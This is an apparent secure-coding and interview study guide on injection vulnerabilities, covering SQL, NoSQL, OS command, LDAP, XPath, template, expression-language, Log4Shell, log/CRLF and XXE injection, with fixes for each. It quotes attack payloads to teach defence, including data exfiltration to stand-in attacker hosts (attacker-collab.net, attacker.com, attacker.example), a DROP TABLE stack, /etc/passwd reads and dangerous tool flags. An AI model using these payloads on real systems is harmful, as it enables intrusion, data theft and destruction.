# Injection Attacks: SQL, NoSQL, Command & LDAP

**Injection** is the class of vulnerabilities where an application takes **untrusted
input** and sends it to an **interpreter** (a SQL engine, a NoSQL query parser, an OS
shell, an LDAP directory, an XML/XPath processor, an expression language, etc.) in a way
that lets the input *break out of its intended data context and be interpreted as code
or structure*. The interpreter then executes the attacker's instructions with the
application's privileges.

Injection sits at **A03:2021 – Injection** in the OWASP Top 10 (2021). It merged the old
"Injection" and "Cross-Site Scripting (XSS)" categories; XSS is now considered a form of
injection into an HTML/JS interpreter. This topic focuses on the *server-side* injection
families — SQL, NoSQL, OS command, LDAP, and XPath — and treats them
**language- and framework-agnostically**: the attacks and the fixes are the same whether
you write Java, Python, Node, Go, or PHP.

> [!KEY-TAKEAWAY]
> Injection is not caused by "bad input" — it is caused by the application **failing to
> separate code from data**. The universal, correct defense is to send the query
> *structure* and the *data* to the interpreter through **separate channels** so the
> data can never be reparsed as code. For SQL that means **parameterized queries /
> prepared statements**. Input validation and escaping are *defense in depth*, not the
> primary fix.

> [!INTERVIEW]
> The single most common injection interview question is *"what actually stops SQL
> injection, and why is escaping the wrong answer?"* The expected answer is
> **parameterized queries / prepared statements** (the driver binds parameters
> out-of-band so user data is never concatenated into the SQL text), with escaping and
> WAFs described as strictly secondary. Being able to also name blind/time-based and
> second-order SQLi, MongoDB operator injection, and `arg`-array command execution
> covers the bulk of what gets probed.

The anchor references throughout are: **OWASP Top 10 2021 (A03 Injection)**, the
**OWASP SQL Injection / SQL Injection Prevention / Query Parameterization Cheat Sheets**,
the **OWASP Testing Guide (WSTG) injection sections**, **OWASP ASVS v4 (V5 Validation,
Sanitization & Encoding)**, **CWE-89 (SQLi), CWE-78 (OS Command Injection), CWE-943
(NoSQL/data-query injection), CWE-90 (LDAP injection), CWE-643 (XPath injection)**.

---

## Root cause: mixing untrusted data with code

Every injection has the **same root cause**: the application builds an instruction for
an interpreter by **concatenating** (or string-interpolating) untrusted data directly
into the instruction text, so the interpreter cannot tell where the *code* the developer
intended ends and the *data* the attacker supplied begins.

Consider the canonical vulnerable SQL:

```
query = "SELECT * FROM users WHERE name = '" + userInput + "'"
```

The developer *intends* `userInput` to be a value. But the SQL parser only sees the final
string. If `userInput` is `' OR '1'='1`, the string becomes:

```sql
SELECT * FROM users WHERE name = '' OR '1'='1'
```

The quote the attacker supplied **closes the string literal early**, and everything after
it is parsed as SQL *code*. The data escaped its context.

This "confusion of contexts" is universal:

| Interpreter | Intended context | Attacker breaks into |
|---|---|---|
| SQL engine | string/numeric literal | SQL keywords, `UNION`, `;` |
| NoSQL (Mongo) | a value in a query document | a **query operator** (`$ne`, `$gt`, `$where`) |
| OS shell | an argument to a command | shell metacharacters (`;`, `|`, `` ` ``, `$()`) |
| LDAP | a filter assertion value | LDAP filter metachars (`*`, `)`, `(`, `&`, `|`) |
| XPath | a node value | XPath operators (`or`, `'`, `]`) |
| HTML/JS (XSS) | text/attribute | `<script>`, event handlers |

Because the cause is structural, the cure is structural: **keep data out of the code
channel**. Sanitizing, escaping, or blocklisting characters attacks the *symptom*
(specific dangerous characters) instead of the *cause* (data being parsed as code), which
is why those approaches are fragile and repeatedly bypassed.

> [!TIP]
> The mental model interviewers want: "code vs data separation." If you can articulate
> that the fix is *sending the query template and the parameter values over separate
> channels so the parser fixes the structure before the data is ever seen*, you have the
> core idea behind prepared statements, parameterized NoSQL queries, and argument arrays
> for shell commands — one principle, many interpreters.

---

## SQL injection: attack techniques

**SQL injection (SQLi, CWE-89)** is injection into a SQL interpreter. Given a foothold
(an unparameterized value), attackers use different techniques depending on what feedback
the application returns.

**In-band (the results come back in the response):**

- **UNION-based** — append `UNION SELECT ...` to pull data from other tables into the
  visible result set. The attacker must match the column count and compatible types:
  ```
  ' UNION SELECT username, password FROM users --
  ```
  They first determine the column count (e.g. `ORDER BY 5--` until it errors, or
  `UNION SELECT NULL,NULL,...`).

- **Error-based** — coerce the database into an error message that *contains data*, e.g.
  forcing a type-conversion error that echoes a subquery result. Depends on verbose DB
  errors being returned to the client (itself a misconfiguration).

**Blind (no data in the response, but behavior differs):**

- **Boolean-based blind** — inject a condition and observe whether the page renders the
  "true" vs "false" state. Extract data one bit at a time:
  ```
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
  ```
  If the page looks "true," the first character is `a`. Binary-search the character space
  to speed this up.

- **Time-based blind** — when there is *no* observable difference in output, make the
  database **sleep** conditionally and measure response latency:
  ```
  ' OR IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0) --      -- MySQL
  '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --  -- Postgres
  ' WAITFOR DELAY '0:0:5' --                                -- MS SQL Server
  ```
  A 5-second delay confirms the injected condition was true. This works even with no
  errors and no visible output ("fully blind").

**Out-of-band (OOB)** — exfiltrate via a side channel the attacker controls, e.g. force
the DB to make a DNS or HTTP request to an attacker domain with data in the hostname
(`... LOAD_FILE(CONCAT('\\\\',(SELECT password),'.attacker.com\\x'))`). Useful when the
response is neither visible nor timing-observable.

> [!WARNING]
> Blind and time-based SQLi mean **"no error and no data in the response" does NOT mean
> you are safe.** Automated tools (sqlmap) fully automate boolean/time extraction. The
> only reliable defense is preventing the injection in the first place, not hiding
> output.

---

## Second-order and stacked-query SQL injection

**Second-order (stored) SQL injection** is when the malicious payload is **stored** by
the application in one request, treated as inert data at that time, and then later
**concatenated into a query in a different code path** — the sink — where it fires. The
classic example: a user registers with the username `admin'--`. Registration parameterizes
its INSERT, so nothing happens then. Later, a "change password" feature builds a query by
concatenating the *stored* username:

```
UPDATE users SET pass='...' WHERE name = 'admin'--'
```

The `--` comments out the rest and the attacker changes `admin`'s password. The lesson:
**data read back from your own database is still untrusted at the point it re-enters a
query.** Parameterize *every* query, including those built from stored values, not just
the ones that touch request parameters.

**Stacked queries (batched statements)** exploit drivers/APIs that allow multiple
`;`-separated statements in one call:

```
'; DROP TABLE audit_log; --
```

Whether this works depends on the database and driver: MS SQL Server and PostgreSQL
often permit stacked queries; classic MySQL C API and many drivers execute only the first
statement per call, so stacking may fail there. **Do not rely on "our DB doesn't allow
stacking" as a defense** — it is a coincidence of the driver, not a security control, and
it does nothing against UNION/blind techniques.

---

## The correct fix: parameterized queries and prepared statements

The **one primary, reliable fix** for SQL injection is **parameterized queries** (a.k.a.
**prepared statements**, **bind variables**). You send the SQL **template** — with
**placeholders** — to the database *first*, so the engine parses and fixes the query
**structure** before any user data is attached. Then you send the parameter **values**
separately; the driver/engine treats them purely as data that fills the placeholders.
**A bound parameter can never change the query's structure**, no matter what characters
it contains.

Vulnerable (string concatenation):

```
db.execute("SELECT * FROM users WHERE name = '" + name + "' AND pw = '" + pw + "'")
```

Fixed (parameterized — placeholder syntax varies by driver, `?` or `:name` or `$1`):

```
db.execute("SELECT * FROM users WHERE name = ? AND pw = ?", [name, pw])
```

Now if `name` is `' OR '1'='1`, the engine looks up a user literally *named*
`' OR '1'='1` — it is data, not code. The injection is structurally impossible.

Key points interviewers probe:

- **Placeholders are for VALUES, not identifiers.** You cannot bind a table name, column
  name, `ORDER BY` column, or `ASC/DESC` as a parameter — those are part of the query
  *structure*. If those must be dynamic, use a **strict allowlist mapping** (validate the
  input against a fixed set of known-good identifiers), never string concatenation.
- **Parameterization is not escaping.** Escaping tries to neutralize dangerous
  characters in a string you still concatenate; parameterization never puts the data into
  the SQL text at all. Parameterization is complete; escaping is best-effort.
- Works uniformly across in-band, blind, and second-order SQLi because all of them
  require breaking out of a data context — which binding forbids.

> [!KEY-TAKEAWAY]
> Per the OWASP SQL Injection Prevention Cheat Sheet, the defenses in priority order are:
> **(1) prepared statements with parameterized queries** (primary), **(2) properly used
> stored procedures**, **(3) allowlist input validation** (for identifiers you cannot
> parameterize), and **(4) escaping user input** (last resort). Options 3 and 4 are
> defense in depth, never the sole control.

---

## Why escaping and blocklists are not the fix

Escaping and blocklisting (denylisting) are the two tempting *wrong* answers.

**Escaping** (e.g. doubling quotes, backslash-escaping) tries to make user data safe to
concatenate. It fails for many reasons:

- **Numeric/unquoted contexts.** If the value is used without quotes
  (`... WHERE id = 5`), quote-escaping does nothing: `1 OR 1=1` needs no quote to inject.
- **Character-set / encoding attacks.** Classic multibyte (e.g. GBK) attacks turned an
  escaping backslash into part of a valid multibyte character, "consuming" the escape and
  leaving an unescaped quote. Escaping is charset-dependent and easy to get wrong.
- **You must pick the right escaper for the right DB and context** every single time;
  one missed spot reintroduces the hole.

**Blocklists** (rejecting inputs containing `'`, `--`, `UNION`, `SELECT`, `;`, etc.) are
worse:

- **They break legitimate data** (a person named `O'Brien`, a password with `--`).
- **They are trivially bypassed**: comment insertion (`UN/**/ION`), case variation
  (`uNiOn`), inline comments, alternate encodings, whitespace tricks, or
  logically-equivalent syntax that the blocklist author never imagined.
- They are a losing arms race — you must block *every* dangerous form; the attacker needs
  *one* you missed.

**Allowlist** validation (accept only known-good, e.g. "this field is an integer" or "one
of these 4 sort columns") *is* useful — but as defense in depth and for the cases you
genuinely cannot parameterize (identifiers), not as the SQLi fix.

> [!WARNING]
> If an interviewer offers "escape all single quotes" or "strip SQL keywords" as the
> answer, that is the trap. Escaping is context/charset-fragile and blocklists are
> bypassable; neither addresses the root cause. Parameterize.

---

## ORM and query-builder pitfalls

ORMs and query builders parameterize by default, which is why they *reduce* SQLi — but
they do **not** make it impossible. The vulnerability returns the moment you drop to raw
strings or interpolate into an ORM API that expects code.

Common ORM/query-builder pitfalls:

- **Raw query methods** (`rawQuery`, `.raw()`, `nativeQuery`, `$queryRawUnsafe`,
  `createNativeQuery`, string HQL/JPQL) built by concatenation reintroduce classic SQLi.
- **String-interpolated fragments** into otherwise-safe builders — e.g. passing a
  user-built `WHERE` clause string, or `Model.objects.extra(where=[userInput])`,
  `.order_by(userInput)`, `.filter(sql=...)`.
- **Dynamic column/table names** — as with raw SQL, these cannot be bound; if driven by
  user input they need an allowlist.
- **HQL/JPQL/JPA** interpolation is still injection into an object-query language; use
  named parameters (`:param`), not string building.
- **`LIKE` clauses** — even parameterized, user input can contain `%`/`_` wildcards; that
  is not SQLi (structure is safe) but can cause unexpected matching / ReDoS-like scans;
  escape wildcards for the *pattern* semantics if needed.

Rule: use the ORM's **parameter binding API**; treat every "raw"/"native"/"unsafe"
escape hatch as if you were writing raw SQL and parameterize it.

---

## NoSQL injection (MongoDB operator injection)

NoSQL databases are not immune — they are vulnerable to **NoSQL injection (CWE-943)**. The
mechanism differs: instead of breaking out of a string with a quote, the attacker injects
**query operators or query documents** where the app expected a plain scalar value.

The most common form is **MongoDB operator injection** via a JSON body. Suppose a login
endpoint does:

```
db.users.find({ username: req.body.username, password: req.body.password })
```

Normally the client sends `{"username":"alice","password":"secret"}`. But if the app
passes the parsed JSON straight into the query, an attacker sends:

```json
{ "username": "alice", "password": { "$ne": "" } }
```

Now the query becomes `{ username: "alice", password: { $ne: "" } }` — "find alice where
password is **not equal to** empty string" — which matches, logging the attacker in
without the password. Similar operators abused: `$gt` (greater than anything), `$regex`
(pattern/oracle), `$in`, and worst of all **`$where`** and `mapReduce`, which can run
attacker-supplied **JavaScript** server-side.

Where the input enters matters:

- **Query-string parsing.** Some frameworks parse `user[password][$ne]=` in a query
  string or form body into a **nested object**, turning a string field into an operator
  object without any JSON.
- **JSON request bodies** are the classic vector.

Defenses (framework-agnostic):

- **Type-check and cast inputs** — enforce that `username`/`password` are **strings**
  (reject objects/arrays) before they reach the query. Schema validation (allowlist of
  types) is the primary control.
- **Do not pass user-controlled objects directly as query documents.** Build the query
  from validated scalar fields.
- **Disable server-side JS** (`$where`, `mapReduce` with JS) where possible.
- Use the driver's typed query builders and, for `$where`-like needs, avoid passing user
  data into evaluated expressions.

> [!KEY-TAKEAWAY]
> SQLi breaks out with a **quote**; MongoDB injection breaks out with an **operator/object**
> (`$ne`, `$gt`, `$where`). Same root cause (untrusted data reinterpreted as query
> structure), different syntax. The fix rhymes: **enforce the expected type** and never
> feed raw user objects into the query.

---

## OS command injection and argument injection

**OS command injection (CWE-78)** happens when an application builds an operating-system
command from untrusted input and hands the string to a **shell**. The shell interprets
metacharacters, so the attacker can chain or substitute commands.

Vulnerable (invoking a shell with a concatenated string):

```
system("ping -c 1 " + userInput)          // runs via /bin/sh -c
```

If `userInput` is `8.8.8.8; cat /etc/passwd`, the shell runs two commands. Dangerous shell
metacharacters include `;`, `&&`, `||`, `|`, `` ` ``, `$( )`, `>`, `<`, `\n`, and glob
chars.

**The correct fix: don't use a shell — pass an argument array (argv) directly to the OS.**
Execute the program with its arguments as **separate array elements**, bypassing shell
parsing entirely:

```
exec(["ping", "-c", "1", userInput])       // no shell; userInput is one argv element
```

Now `8.8.8.8; cat /etc/passwd` is passed to `ping` as a *single argument* (a bogus
hostname) — there is no shell to interpret the `;`. This is the analogue of parameterized
queries for the OS: **separate the command from its data.** Avoid the "shell mode" of
exec APIs (`shell=True`, `sh -c`, `Runtime.exec(String)` which on some platforms tokenizes,
backticks, `os.system`).

**Argument injection** is the subtler cousin, and it is **not** fixed by argv arrays
alone. Even with no shell, if the attacker controls an argument, they may inject
**additional flags/options** that change the target program's behavior. Examples:

- A value beginning with `-` or `--` is parsed as an **option**, not data
  (e.g. injecting `--output=/path` into a converter, or a value like
  `-oProxyCommand=...` into `ssh`, or `--upload-file` into `curl`).
- Injecting extra args into `git`, `tar`, `find -exec`, etc. to read/write files or run
  code.

Defenses for argument injection: validate values against an **allowlist**; use `--` to
signal "end of options" where the tool supports it so subsequent tokens are treated as
operands; never let user input supply option flags; prefer native library calls over
shelling out at all.

> [!WARNING]
> "I switched to an argv array" stops **command chaining** but not **argument
> injection**. If user input can start with `-`, a tool may treat it as a flag. Also
> allowlist-validate the values and use `--` end-of-options where available.

---

## LDAP injection

**LDAP injection (CWE-90)** targets the **LDAP search filter** language (RFC 4515). LDAP
filters use a prefix/parenthesized syntax with metacharacters `(`, `)`, `*`, `&`, `|`,
`!`, `=`, and NUL. If user input is concatenated into a filter, the attacker manipulates
the search logic.

Vulnerable authentication filter:

```
(&(uid=<userInput>)(userPassword=<pwInput>))
```

If `userInput` is `*` , the filter `(&(uid=*)(...))` matches **any** uid (a wildcard
enumeration / auth bypass). Injecting `admin)(&))` or similar can rewrite the boolean
structure — e.g. turning it into `(&(uid=admin))(&(...))` so the password clause is
neutralized, or using `)(|(uid=*` to inject an OR that always matches.

Defenses:

- **Escape/encode LDAP special characters** per RFC 4515 for the *search filter* context:
  `\` `*` `(` `)` and NUL are escaped as `\5c \2a \28 \29 \00`. Distinguish **filter**
  escaping (RFC 4515) from **DN** escaping (RFC 4514) — the rule sets differ.
- **Allowlist-validate** inputs (e.g. a username is alphanumeric).
- Use **parameterized/bind APIs** or safe filter-builder libraries that assemble filters
  with proper escaping rather than string concatenation.
- Follow the **OWASP LDAP Injection Prevention Cheat Sheet**.

LDAP injection is one of the few injection classes where **context-correct escaping is
the primary practical defense**, because LDAP protocol libraries typically do not offer
"bind parameter" placeholders the way SQL drivers do; use a library that escapes for you.

---

## XPath and other query-language injection

**XPath injection (CWE-643)** is injection into an **XPath** expression used to query an
XML document (common in XML-based auth stores or config lookups). It mirrors SQLi closely
because XPath, like SQL, mixes string literals and boolean logic.

Vulnerable:

```
/users/user[username/text()='<in>' and password/text()='<pw>']
```

Inject username `' or '1'='1` and the predicate is always true — an auth bypass, exactly
like `' OR '1'='1` in SQL. **Blind XPath injection** exists too: using `substring()` and
`string-length()` with true/false observation to extract the whole document node by node.

Defenses:

- **Parameterize XPath** using precompiled expressions with **variable binding** (e.g.
  `XPathVariableResolver`-style APIs) so user data fills variables, not the expression
  text.
- If binding is unavailable, **escape** quotes correctly for the XPath string context
  (note: XPath 1.0 has no escape sequence inside a literal — you must switch quote styles
  or use `concat()`), and **allowlist**-validate.
- Follow the **OWASP XPath Injection** guidance.

The same "data reparsed as code" pattern recurs across other interpreters interviewers may
mention: **XXE** (XML external entities — an XML-parser injection, A05 territory),
**expression-language / template injection** (SpEL, OGNL, SSTI), **log injection**, and
**HTTP header/CRLF injection**. All are cured by the same principle: keep untrusted data
out of the code/structure channel, or contextually encode it for exactly the sink.

---

## Least privilege and defense in depth

Even with parameterization as the primary control, you assume a bug might slip through and
**limit the blast radius** — this is defense in depth, and it directly maps to OWASP and
ASVS guidance.

**Least-privilege database accounts:**

- The application should connect with an account that has **only the rights it needs** —
  typically `SELECT/INSERT/UPDATE/DELETE` on specific tables, **not** DBA/`sa`/`root`, and
  **not** DDL (`DROP`, `ALTER`) or `FILE`/`xp_cmdshell`/`LOAD_FILE` privileges.
- Use **separate accounts per service/context** and even read-only accounts for read
  paths. This turns a successful SQLi from "full DB + OS takeover" into "read the rows
  this account could already read."
- Disable dangerous features: `xp_cmdshell` (MS SQL), server-side JS/`$where` (Mongo),
  `LOAD_FILE`/`INTO OUTFILE` (MySQL) unless required.

**Defense in depth stack** (each layer independent; none replaces parameterization):

1. **Parameterized queries** (primary).
2. **Allowlist input validation** (type, length, format) at the boundary.
3. **Least-privilege DB accounts** + disabled dangerous features.
4. **Least data exposure** — no verbose DB errors to clients (kills error-based SQLi and
   info leakage); generic error pages.
5. **Monitoring/alerting** for anomalous query patterns.
6. **Network segmentation** so the DB isn't reachable/exfiltratable arbitrarily.

> [!TIP]
> When asked "you already parameterize — why bother with least privilege?", the answer is
> *defense in depth*: parameterization can be undone by one future raw query, a
> vulnerable dependency, or a second-order bug. Least privilege bounds the damage of the
> injection you didn't catch.

---

## Stored procedures: nuance

Stored procedures are **often** listed as a defense, but they are **not automatically
safe** — and interviewers love this nuance.

- A stored procedure is safe **only if it does not itself build and execute dynamic SQL
  from its parameters by concatenation.** A procedure that does
  `EXEC('SELECT ... WHERE x=' + @param)` (or `sp_executesql` with a concatenated string)
  is **just as injectable** as inline concatenation — the vulnerability moved into the DB.
- A stored procedure that uses its parameters only in **static** SQL (parameters bound as
  values) is safe, and calling it with **bound parameters** from the app is equivalent to
  a parameterized query.
- If a procedure must build dynamic SQL, it should use **`sp_executesql` with parameter
  markers** (or the DB's equivalent parameterized dynamic-SQL API), not string
  concatenation.

So "we use stored procedures" is **not** a complete answer. The property that matters is
*parameterization end-to-end* — whether the SQL text is ever concatenated with untrusted
data, inside the proc or out.

---

## Why a WAF is not a fix

A **Web Application Firewall (WAF)** inspects HTTP traffic and blocks requests matching
known attack signatures. It is a useful **detective/compensating control**, especially
for virtual-patching a known bug while you deploy a real fix — but it is **not a fix** and
must never be the primary defense against injection.

Why a WAF is insufficient:

- **It is a blocklist at the network edge** — same fundamental weakness as any blocklist:
  attackers bypass signatures with encoding, comments, case, whitespace, chunking,
  logically-equivalent payloads, and novel techniques. New bypasses are published
  constantly.
- **It doesn't understand your app's query context.** It can't know whether a `'` is
  malicious or a legitimate name; it guesses, causing **false positives** (blocking real
  users) and **false negatives** (missing real attacks).
- **It can't stop what it can't see** — payloads delivered via non-HTTP paths,
  second-order injection (stored now, fired later from a benign-looking internal path), or
  server-to-server calls bypass the edge WAF entirely.
- Encrypted/normalized/obfuscated payloads and protocol quirks routinely evade rules.

Correct posture: **fix the code (parameterize) as the primary control**; use a WAF as an
*additional* layer for monitoring, rate-limiting, and buying time (virtual patching) — not
as a substitute for secure coding. This mirrors the OWASP position that WAFs are defense
in depth.

> [!WARNING]
> "We have a WAF" is never an acceptable answer to "how do you prevent SQL injection." A
> WAF is a bypassable blocklist that lacks query context; the fix is parameterized
> queries in the application.

---

## Detecting and testing for injection

- **Static analysis (SAST)** flags tainted data flowing from a source (request) to a sink
  (query/exec/filter) without sanitization — good at finding concatenation-into-query
  patterns.
- **Dynamic testing (DAST)** and tools like **sqlmap** fuzz parameters and automate
  UNION/boolean/time-based extraction; **NoSQLMap** and manual `$ne`/`$gt` payloads test
  NoSQL.
- **Manual testing** per **OWASP WSTG**: submit `'`, `"`, `;`, `--`, `)`, `*`, and
  operator objects and observe errors, differing responses, or timing changes; try
  time-based `SLEEP`/`pg_sleep`/`WAITFOR` to detect blind cases.
- **Code review** for every raw/native query, `exec`/`system` call, filter string, and
  ORM escape hatch is the highest-signal manual check.

---

## Parameterization edge cases: IN-lists, LIKE, LIMIT, and identifiers

Parameterization is the primary fix, but several everyday query shapes trip developers who
"parameterize everything." Interviewers use these as "which fix is correct?" traps.

- **`IN (...)` lists.** You **cannot** bind a comma-separated string or an array to a single
  `?`. `WHERE id IN (?)` with the value `"1,2,3"` binds the literal string `'1,2,3'` to one
  parameter — it matches nothing (or errors), it does **not** expand to three values.
  Generate **N placeholders dynamically** and bind N values:
  `IN (` + `?,`×n (trimmed) + `)` → `WHERE id IN (?,?,?)` with `[1,2,3]`. The **structure**
  (placeholder count) is code you build from a validated count; the **values** are bound.
- **`LIKE` wildcard escaping.** Binding is enough to stop SQLi in a `LIKE` clause, but the
  bound value is still interpreted as a *pattern*: user input containing `%` or `_` becomes
  a wildcard. To search for a literal `%`, escape it and declare the escape char:
  `WHERE name LIKE ? ESCAPE '\'` and pass `foo\%bar`. This is a **correctness/DoS** concern
  (leading-`%` scans), not an injection breakout — but the escaping is per-pattern, not the
  SQLi fix.
- **`LIMIT` / `OFFSET`.** Many engines accept these as bound parameters; where they don't,
  **cast to integer** in the app and validate range — never concatenate a raw string.
- **Dynamic `ORDER BY` column and direction.** Neither the column nor `ASC`/`DESC` can be
  bound. Map user input through a **strict allowlist** (`{"date": "created_at", ...}`) and
  emit only server-controlled identifiers; validate direction against `{ASC, DESC}`.
- **Dynamic table/column names.** Same rule: allowlist to a fixed set of known identifiers,
  never interpolate raw input, even after "escaping."

> [!INTERVIEW]
> "Your app parameterizes everything but still got SQLi — how?" Enumerate the real causes:
> (1) a **second-order** stored value re-entering a concatenated query, (2) a
> **raw/`nativeQuery`/`$queryRawUnsafe`** escape hatch, (3) **dynamic identifier**
> concatenation (`ORDER BY` column, table name) that binding can't cover, or (4) a **stored
> procedure** that builds dynamic SQL by concatenation internally. Binding values does not
> protect the query *structure*.

---

## NoSQL syntax, blind, and timing injection

Operator injection (`$ne`, `$gt`, `$where`) is the headline NoSQL attack, but the family is
broader. When a NoSQL query is **built as a string** (e.g. a `$where` JavaScript expression,
or a driver that accepts a JSON/BSON string assembled by concatenation), the classic
**syntax injection** returns:

- **String breakout.** Injecting `'` / `"` to break out of a quoted string inside a `$where`
  clause, or a null byte (`%00`) to truncate. Payloads like `admin' || '1'=='1` or
  `' || true || '` force an always-true JS condition, an auth bypass exactly analogous to
  `' OR '1'='1` in SQL.
- **`$regex` blind extraction.** Where a value is placed into a `$regex`, an attacker can
  extract a secret character-by-character with anchored patterns: `{"$regex":"^a"}`,
  `{"$regex":"^ab"}`, … observing which prefix returns a match (a boolean oracle) — the
  NoSQL equivalent of boolean-blind SQLi.
- **`$where` timing extraction.** `$where` runs server-side JS, so a conditional
  `function(){ if(this.user[0]==='a'){ sleep(5000); } return true; }` turns latency into a
  data channel — time-based blind, NoSQL flavor.
- **Query-string-to-object parsing** (already noted): `username[$ne]=` becomes
  `{username:{$ne:...}}` with no JSON at all.

Defenses layer the same way: **enforce scalar types** (reject objects/arrays where a string
is expected), never build `$where`/query strings from user input, **disable server-side JS**
(`security.javascriptEnabled: false` / `--noscripting`), and use typed query builders.

---

## Blind OS command injection and the argument-injection arsenal

**Blind OS command injection** is the command-injection analogue of blind SQLi: the command
runs but its output never reaches the response. Attackers confirm and exploit it via:

- **Time delay**: `& ping -c 10 127.0.0.1 &` or `& sleep 10 &` — a measurable delay proves
  execution.
- **Output redirection to a web-reachable path**: `& whoami > /var/www/html/out.txt &`,
  then fetch the file.
- **OAST exfiltration**: `& nslookup $(whoami).attacker-collab.net &` — DNS/HTTP to an
  attacker-controlled collaborator, useful even when egress is firewalled (DNS often
  escapes).

**Argument injection** deserves its own arsenal because an argv array (which stops chaining)
does **not** stop it. If user input becomes a token in the argv list, tools with dangerous
flags can be turned into file read/write or RCE primitives:

- `curl`: `-o/--output`, `--upload-file`, `-K/--config` (read an attacker config file).
- `ssh`: `-oProxyCommand=...`, `-o` options generally.
- `tar`: `--checkpoint-action=exec=...`; `find`: `-exec ...`.
- `git`: `--upload-pack=...`, `-c core.sshCommand=...`; `zip`: `--unzip-command`;
  `wget`: `--use-askpass=...`.

Defenses: **allowlist-validate values**, reject values starting with `-`, and pass `--`
(end-of-options) before user operands where the tool supports it so subsequent tokens are
treated as data.

> [!WARNING]
> **`escapeshellcmd` vs `escapeshellarg`.** `escapeshellcmd` escapes shell metacharacters but
> still lets input add an **extra argument** (it does not quote to a single argument) — so it
> stops command *chaining* but not *argument* injection. `escapeshellarg` wraps the value in
> quotes so it is exactly **one argument**. If you must build a shell string, quote each
> argument with the per-argument escaper; better still, use an argv array and skip the shell.

---

## Server-side template injection (SSTI)

**Server-side template injection (SSTI, CWE-1336 / CWE-94)** occurs when user input is
concatenated into a **template that the server then renders**, so the input is evaluated as
**template expression code** rather than data. Because template engines expose object
graphs and often a path to the runtime, SSTI frequently escalates to **remote code
execution (RCE)** — it is far more severe than the XSS it superficially resembles.

- **Detection.** Submit a math expression in the suspected sink: `{{7*7}}`. If the response
  contains `49`, the expression was evaluated server-side (SSTI). Contrast with XSS: a
  reflected `<script>` that runs in the *browser* is client-side and is not SSTI.
- **Engine fingerprinting.** `{{7*'7'}}` returns `49` in **Twig** (numeric coercion) but
  `7777777` in **Jinja2** (string repetition) — the differing result identifies the engine,
  which drives the RCE gadget chain.
- **Escalation.** From a confirmed expression sink, attackers walk the object/class graph to
  reach OS command execution (e.g. Jinja2 `{{''.__class__...}}` chains, Freemarker
  `Execute`, Velocity `$class` reflection).

Defenses: never render **user-supplied templates**; keep untrusted input as **template
*data* (context variables)**, never concatenated into the template source; prefer
**logic-less engines** (Mustache) for user-influenced templates; sandboxes exist but are
**bypass-prone** and are not a primary control.

> [!KEY-TAKEAWAY]
> `{{7*7}}` → `49` on the server means SSTI (RCE-grade); the same payload that only executes
> in the browser is XSS. The fix is structural, same as all injection: user input is data
> that fills template variables, never part of the template *source*.

---

## Expression-language injection: OGNL, SpEL, and the Struts CVEs

**Expression-language (EL) injection (CWE-917)** is SSTI's cousin outside the HTML-templating
world: untrusted input reaches an expression evaluator such as **OGNL** (Struts, MyBatis),
**SpEL** (Spring Expression Language), or JSP/JSF EL, and is executed.

- **CVE-2017-5638 (Apache Struts 2, the Equifax breach).** The Jakarta Multipart parser
  evaluated the `Content-Type` HTTP header as an **OGNL** expression; a crafted
  `Content-Type` header ran arbitrary OS commands. This is the canonical "name a famous
  injection breach" answer — attacker input reached an expression interpreter via a header.
- **CVE-2018-11776 (Struts 2).** OGNL evaluation of the namespace/action when configuration
  used untrusted values — another OGNL RCE.

What would have prevented these: **not evaluating untrusted input as an expression** —
upgrading past the vulnerable parser, and never routing request-controlled strings (headers,
params) into OGNL/SpEL evaluation. The mechanism, again, is data crossing into the code
channel of an interpreter.

---

## Log4Shell and JNDI injection

**Log4Shell (CVE-2021-44228, CVSS 10.0)** is an **interpolation/injection** flaw in Apache
Log4j 2. Log4j performed **message lookups**: a logged string containing `${...}` was
interpolated, and the `jndi:` lookup would resolve a **JNDI** name over LDAP/RMI. So logging
any attacker-controlled string — a `User-Agent`, an `X-Forwarded-For` header, a username —
that contained:

```
${jndi:ldap://attacker.example/a}
```

made the server fetch and **deserialize/load a remote Java class**, yielding RCE. The
follow-ups **CVE-2021-45046** (incomplete fix, later rated 9.0) and **CVE-2021-45105**
(recursive-lookup DoS) show how partial mitigations fell short.

- **Root cause:** untrusted data placed into a **string that is later interpreted** (the log
  message template with lookup interpolation) — the same code-vs-data failure, in a logging
  library nobody thought of as an interpreter.
- **Fixes/mitigations, in order of goodness:** **upgrade Log4j** (2.17.1+); remove the
  `JndiLookup` class; the flag `log4j2.formatMsgNoLookups=true` was a **partial** mitigation
  (it disables message lookups but did not fully address `-45046`), which is why upgrading is
  the real fix. Egress filtering to block outbound LDAP/RMI limits blast radius.

JNDI injection more generally: any app that resolves an **attacker-influenced JNDI name** is
exposed to remote-class-loading RCE, independent of Log4j.

---

## Log injection and CRLF / header injection

**Log injection / log forging (CWE-117).** If unsanitized input is written to a log,
injecting CR/LF (`%0d%0a`) lets an attacker **forge fake log entries**, corrupt log
integrity, hide their tracks, or mislead responders. A sharper variant is **log poisoning**:
inject code (e.g. PHP) into a log the server will later include/render, turning the log file
into an RCE vector. Defense: **neutralize newlines** in logged values (encode/strip CR/LF),
log values as structured fields (JSON) rather than concatenated lines, and never
`include`/execute log content.

**CRLF / HTTP header injection & response splitting (CWE-93 / CWE-113).** When untrusted
input is placed into an HTTP **header** (a `Location` redirect, a `Set-Cookie` value) without
stripping CR/LF, `%0d%0a` lets the attacker **inject additional headers** or **split the
response** into two — enabling forged headers, cookie injection, or **cache poisoning**.
Defense: never build header values from raw input; strip/reject CR, LF, and NUL; rely on
framework header APIs that reject control characters. This is why redirect targets and
cookie values must be validated, not just concatenated.

---

## XML external entity (XXE) injection

**XXE (CWE-611)** is injection into an **XML parser** via a `DOCTYPE` with an external
entity. An attacker who can submit XML defines an entity that the parser resolves:

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<r>&x;</r>
```

Consequences: **local file disclosure** (read `/etc/passwd`), **SSRF** (`SYSTEM
"http://169.254.169.254/..."` to hit internal services/metadata), and **denial of service**
via entity expansion (the **billion-laughs** attack — nested entities that expand
exponentially). Blind XXE exfiltrates via **out-of-band** parameter entities to an
attacker server.

Defense (the definitive fix): **disable DTDs / DOCTYPE processing entirely**
(`disallow-doctype-decl = true`), or at minimum disable **external general and parameter
entities** and entity expansion, per the OWASP XXE Prevention Cheat Sheet. Use a parser
configured secure-by-default and prefer less complex formats (JSON) where possible.

---

